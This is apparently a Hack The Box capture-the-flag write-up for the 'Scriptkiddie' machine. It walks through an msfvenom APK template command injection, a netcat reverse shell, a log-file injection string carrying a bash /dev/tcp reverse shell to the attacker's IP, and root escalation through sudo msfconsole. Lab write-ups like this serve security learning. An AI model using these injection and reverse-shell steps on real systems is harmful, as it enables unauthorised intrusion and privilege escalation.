# Hackthebox: Scriptkiddie writeup

Scriptkiddie is an easy box which is based around using a hacker's tools against them. Definitely an interesting concept that taught me we also need to be careful even if we're technically minded.

## Enumeration

First of all, running nmap to check for open ports:

```
nmap -p- 10.10.10.226

Starting Nmap 7.60 ( https://nmap.org ) at 2021-06-05 12:26 BST
Nmap scan report for scriptkiddie.htb (10.10.10.226)
Host is up (0.017s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 9.76 seconds
```

I check out `http://scriptkiddie.htb:5000/`, which seems to have a few options: nmap, payload generation, and searchsploit.
I eventually noticed that in the payload generation there's an option to generate a payload with android which seemed unusual.
After some googling, there seems to be a vulnerability (https://www.exploit-db.com/exploits/49491) with msfvenom's apk payload generation. 
It seems possible to manufacture a .apk template for the msfvenom command which allows us to run a command on the remote system.

## Foothold

Looking up in `msfconsole`, there seems to be an exploit for it there that we can use:
```
   0  exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection  2020-10-29       excellent  No     Rapid7 Metasploit Framework msfvenom APK Template Command Injection

msf6 > use 0
[*] No payload configured, defaulting to cmd/unix/reverse_netcat

msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > show options

Module options (exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME  msf.apk          yes       The APK file name


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  127.0.0.1        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

   **DisablePayloadHandler: True   (no handler will be created!)**


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > set lhost 10.10.?.?
lhost => 10.10.?.?
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > run

```

This will generate the evil apk file:

```
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > run

[+] msf.apk stored at /home/erry/.msf4/local/msf.apk
```

Now we have to start a reverse shell ourselves on the host and port that we specified earlier.

```
erry@erry-Virtual-Machine:~/hax$ nc -lvnp 4444
Listening on [0.0.0.0] (family 0, port 4444)
```

Go back to the scriptkiddie website. Select OS: android , lhost: 127.0.0.1 (it doesn'#t matter), and as template file select the evil apk generated earlier.

Wait on our reverse shell, seems like we got a connection:

```
erry@erry-Virtual-Machine:~/hax$ nc -lvnp 4444
Listening on [0.0.0.0] (family 0, port 4444)

Connection from 10.10.10.226 32962 received!

id
uid=1000(kid) gid=1000(kid) groups=1000(kid)
```

## User Flag

It seems we have a connection from the user `kid`. 
We can directly read `/home/kid` and `/home/kid/user.txt`.
Congrats, you have the user flag!
```
cat /home/kid/user.txt
```


If desired, we can add our public key in `/home/kid/.ssh/authorized_hosts` to be able to easily access the machine in future.

## Privesc (pwn)

It doesn't look like `kid` can do much and we do not have sudo password.
However, checking around the system it seems that there is another user that may be interesting:


```
kid:x:1000:1000:kid:/home/kid:/bin/bash
pwn:x:1001:1001::/home/pwn:/bin/bash
```

We can read pwn's home dir and we find this file:

```
kid@scriptkiddie:~$ cat /home/pwn/scanlosers.sh
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```

It looks like the pwn user is constructing an nmap command based on the `/home/kid/logs/hackers` file. 
Maybe we can take advantage of that running command to run a command of our own when the script runs?

After some crafting, we have a string that we can put in the `logs/hackers` file:

```
  ;  /bin/bash -c "bash -i >& /dev/tcp/10.10.14.6/4442 0>&1" #
```

The space in front is for the `cut -d ' ' -f3-` command because it will grab the string after 2 spaces. This will force the executed command to be like this:

```
sh -c "nmap --top-ports 10 -oN recon/; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.6/4442 0>&1' # rest of command here"
```

which will force a bash shell to open as `pwn`.

Now we have the connection on our reverse shell!

```
pwn@scriptkiddie:~$ id
id
uid=1001(pwn) gid=1001(pwn) groups=1001(pwn)
pwn@scriptkiddie:~$
```

# Privesc (root)

Right away we see that we have sudo:

```
pwn@scriptkiddie:~$ sudo -l
sudo -l
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
```

It looks like we can run msfconsole as root.

```
pwn@scriptkiddie:~$ sudo msfconsole
sudo msfconsole
```

now we can just run `bash` through msfconsole.

```
id
uid=0(root) gid=0(root) groups=0(root)
```

```
cat /root/root.txt
```

Congrats, we have the root flag!

